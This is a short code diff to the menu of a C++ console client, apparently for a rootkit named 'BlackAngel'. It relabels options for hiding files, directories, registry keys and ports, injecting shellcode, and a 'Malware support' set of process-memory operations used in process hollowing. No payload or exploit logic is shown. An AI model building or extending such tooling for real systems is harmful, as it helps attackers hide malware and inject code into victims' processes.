@@ -2,6 +2,7 @@
 #include <string>
 #include <io.h>
 #include <fcntl.h>
+#include <vector>
 
 UINT32 GetInputUint()
 {
@@ -82,14 +83,15 @@ int main()
         std::cout << "6. Hide File\n";
         std::cout << "7. Hide Directory\n";
         std::cout << "8. Hide Registry Key\n";
-        std::cout << "9. Inject Shellcode\n\n";
+        std::cout << "- Inject Shellcode\n\n";
         std::cout << "--- Malware support: ---\n";
-        std::cout << "11. Query information process\n";
-        std::cout << "12. Unmap view of section\n";
-        std::cout << "13. Allocate virutal memory\n";
-        std::cout << "14. Write virtual memory\n";
-        std::cout << "15. Read virtual memory\n";
-        std::cout << "16. Copy memory\n";
+        std::cout << "- Query information process\n";
+        std::cout << "- Unmap view of section\n";
+        std::cout << "- Allocate virutal memory\n";
+        std::cout << "- Write virtual memory\n";
+        std::cout << "- Read virtual memory\n";
+        std::cout << "- Copy memory\n";
+        std::cout << "- Protect virtual memory\n";
         std::cout << "99. Exit\n";
         std::cout << "Option: "; std::cin >> option;
 
@@ -123,6 +125,8 @@ int main()
                     return -1;
                 BlackAngel::HidePort(hp);
             }
+
+
 
             case 99:
                 return 0;
